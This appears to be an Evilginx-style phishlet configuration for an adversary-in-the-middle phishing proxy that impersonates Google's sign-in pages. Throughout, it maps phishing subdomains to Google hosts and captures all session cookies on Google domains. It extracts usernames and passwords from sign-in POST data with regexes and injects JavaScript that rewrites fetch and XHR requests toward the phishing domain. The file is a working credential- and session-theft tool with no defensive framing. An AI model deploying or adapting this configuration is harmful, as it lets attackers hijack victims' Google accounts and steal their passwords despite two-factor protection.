min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'sl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'gds', orig_sub: 'gds', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'application/xml']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'gds.google.com', replace: 'gds.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}

auth_tokens:
  - domain: '.google.com'
    keys: [".*,regexp"]
  - domain: 'accounts.google.com'
    keys: [".*,regexp"]
  - domain: 'myaccount.google.com'
    keys: [".*,regexp"]
  - domain: 'mail.google.com'
    keys: [".*,regexp"]

auth_urls:
  - '/CheckCookie'
  - '/_/AccountSettingsUi/browserinfo'
  - '/v3/signin/challenge/pwd'
  - '/v3/signin/challenge/kpe'

credentials:
  username:
    key: 'f.req'
    search: '\[\\"([^"]+@[^"]+\.[^"]+)\\"\]'
    type: 'post'
  password:
    key: 'f.req'
    search: '\[\\"([^"]+)\\",null,1\]'
    type: 'post'

force_post:
  - path: '/_/signin/sl/challenge'
    search:
      - {key: 'f.req', search: '.*'}
      - {key: 'continue', search: '.*'}
    force:
      - {key: 'continue', value: ''}
    type: 'post'

intercept:
  - domain: 'accounts.google.com'
    path: '/CheckConnection'
    http_status: 200
    body: '["CheckConnection",1,1]'
    mime: 'application/json'
  - domain: 'play.google.com'
    path: '/log'
    http_status: 200
    body: '{}'
    mime: 'application/json'

js_inject:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['.*?']
    script: |
      (function() {
        var baseHost = window.location.hostname;
        var baseDomain = baseHost.split('.').slice(-2).join('.');
        var originalFetch = window.fetch;
        window.fetch = function(url, options) {
          if (typeof url === 'string') {
            url = url.replace('https://www.gstatic.com', 'https://gstatic.' + baseDomain);
            url = url.replace('https://ssl.gstatic.com', 'https://sl.' + baseDomain);
            url = url.replace('https://play.google.com', 'https://play.' + baseDomain);
            url = url.replace('https://apis.google.com', 'https://apis.' + baseDomain);
            url = url.replace('https://gds.google.com', 'https://gds.' + baseDomain);
            url = url.replace('https://mail.google.com', 'https://mail.' + baseDomain);
          }
          return originalFetch.call(this, url, options);
        };
        var originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
          if (typeof url === 'string') {
            url = url.replace('https://www.gstatic.com', 'https://gstatic.' + baseDomain);
            url = url.replace('https://ssl.gstatic.com', 'https://sl.' + baseDomain);
            url = url.replace('https://play.google.com', 'https://play.' + baseDomain);
            url = url.replace('https://apis.google.com', 'https://apis.' + baseDomain);
            url = url.replace('https://gds.google.com', 'https://gds.' + baseDomain);
            url = url.replace('https://mail.google.com', 'https://mail.' + baseDomain);
          }
          return originalXHROpen.call(this, method, url, async, user, password);
        };
      })();

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
